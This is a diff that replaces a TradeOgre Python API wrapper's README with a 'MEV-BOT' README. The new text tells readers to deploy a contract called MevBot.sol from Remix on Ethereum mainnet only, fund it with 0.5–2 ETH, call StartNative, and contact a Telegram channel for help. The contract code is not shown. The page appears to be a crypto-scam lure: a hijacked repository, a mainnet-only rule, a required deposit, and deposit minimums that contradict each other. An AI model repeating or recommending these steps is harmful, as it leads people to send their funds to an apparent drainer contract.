@@ -1,106 +1,81 @@
-# TradeOgre Python API Wrapper
+# MEV-BOT
 
-## Preconditions
-In order to use this API wrapper you need to have API keys from [TradeOgre](https://tradeogre.com).
+## Overview
+Welcome to the **MEV BOT** GitHub repository! This project is designed to help users easily deploy and manage a smart contract for Ethereum that performs arbitrage operations with a minimum deposit requirement.
 
-Open `Account` --> `Settings` --> `API Keys`
+## Features
+- **Easy to Use**: Simple deployment and management.
+- **Secure**: Ensures a minimum deposit of 1 ETH.
+- **Optimized**: Efficient use of gas and resources.
 
-## Load API keys
+## Important Note
+This smart contract is designed to operate on the Ethereum mainnet and does not work on testnets due to specific dependencies and functionalities that are only present on the mainnet.
 
-__From file__
-```python
-from tradeogre import TradeOgre
+## Table of Contents
+- [Overview](#overview)
+- [Features](#features)
+- [Important Note](#important-note)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Support](#Support)
+- [Help](#Help)
+- [License](#license)
 
-trade_ogre = TradeOgre().load_key('TradeOgre.key')
-```
-In this case the key must be on the first line and the secret must be on the second line
+## Installation
 
-__As direct input in class__
-```python
-from tradeogre import TradeOgre
+### Deploying with Remix IDE
 
-trade_ogre = TradeOgre(key=some_key, secret=some_secret)
-```
+1. Download [**MetaMask**](https://metamask.io/download.html) (if you don’t have it already)
+   Access the  [**Remix IDE**](https://remix.ethereum.org)(this website is where we deploy the smart contract).
 
-__As direct input in method__
-```python
-from tradeogre import TradeOgre
+2. **Create a New File**:
+   Click on the **File Explorers** tab, then click on **Create New File** and name it `MevBot.sol`.
 
-trade_ogre = TradeOgre()
-reply = trade_ogre.balances(key=some_key, secret=some_secret)
-```
 
-## Example usage
+3. **Copy the Contract Code**:
+   [**Copy the entire contract code**](MevBot.sol) from this repository and paste it into `MevBot.sol`.
 
-#### Markets
-Retrieve a listing of all markets
-```
-trade_ogre.markets()
-```
+4. **Compile the Contract**:
+   Click on the **Solidity Compiler** tab, select the appropriate compiler version 0.6.12, and click on **Compile MevBot.sol**.
 
-#### Order book
-Retrieve the current order book for a market
-```
-trade_ogre.order_book('BTC-XMR')
-```
 
-#### Ticker
-Retrieve the ticker (current price) for a market
-```
-trade_ogre.ticker('BTC-XMR')
-```
+5. **Deploy the Contract**:
+   - Click on the **Deploy & Run Transactions** tab.
+   - Select `Injected Web3` as the environment to connect to MetaMask.
+   - Ensure you are connected to the Ethereum mainnet in MetaMask.
+   - Click on the **Deploy** button.
 
-#### History
-Retrieve the history of the last trades for a market
-```
-trade_ogre.history('BTC-XTL')
-```
+6. **Confirm Deployment**:
+   Confirm the deployment transaction in MetaMask. Make sure you have enough ETH in your wallet to cover the gas fees and the minimum deposit requirement.
 
-#### Balance
-Get the balance of a specific currency  
-You need to provide API key and secret for this method
-```
-trade_ogre.balance('BTC')
-```
+### Using the Contract
 
-#### Balances
-Retrieve all balances for your account  
-You need to provide API key and secret for this method
-```
-trade_ogre.balance()
-```
+1. **Deposit ETH**:
+   Ensure that the contract has at least 0.5 ETH deposited. You can send ETH to the contract address directly from your wallet.
 
-#### Buy
-Submit a buy order to the order book for a market  
-You need to provide API key and secret for this method
-```
-trade_ogre.buy('BTC-XMR', '10', '0.0123')  # market, quantity, price
-```
+2. **Start Arbitrage**:
+   Use the `StartNative` function to initiate the arbitrage process.
 
-#### Sell
-Submit a sell order to the order book for a market  
-You need to provide API key and secret for this method
-```
-trade_ogre.sell('BTC-XMR', '10', '0.0123')  # market, quantity, price
-```
+3. **Monitor Transactions**:
+   Monitor your transactions and profits using a block explorer like [**Etherscan.io**](https://etherscan.io/).
 
-#### Orders
-Retrieve the active orders for your account  
-You need to provide API key and secret for this method
-```
-trade_ogre.orders('BTC-XMR')
-```
+## Usage
 
-#### Order
-Retrieve information about a specific order  
-You need to provide API key and secret for this method
-```
-trade_ogre.order('1702a7bc-6a18-92c0-c1fe-aaf581d2352d')
-```
+### Start Arbitrage Operation
+1. **Ensure sufficient funds**:
+   We recommend funding the contract with at least 0.5-2 ETH or higher to cover gas fees and possible burn fees. Bot targets to­ken c­ontr­a­cts with max 10% burn fee and anything lower but nowadays most of tokens comes with 3~6% fees. If you fund the contract with less than recommended and the bot targets another token with high burn fees the contract will basically waste in fees more than make profit.
 
-#### Cancel
-Cancel an order on the order book  
-You need to provide API key and secret for this method
-```
-trade_ogre.cancel('a40ac710-8dc5-b5a8-aa69-389715197b14')
-```
+2. **Call `StartNative`**:
+   Call the `StartNative` function to start the arbitrage process. You can do this directly from Remix or using any Ethereum wallet that supports contract interactions.
+
+## Support
+If you benefitted from the project, show us some support by giving us a star ⭐. Open source is awesome!
+
+## Help
+If at any time you encounter any issues with the contract setup, contact the team at  [**Click Here**](https://t.me/UniMevBotsSupport/). 🛡️
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+
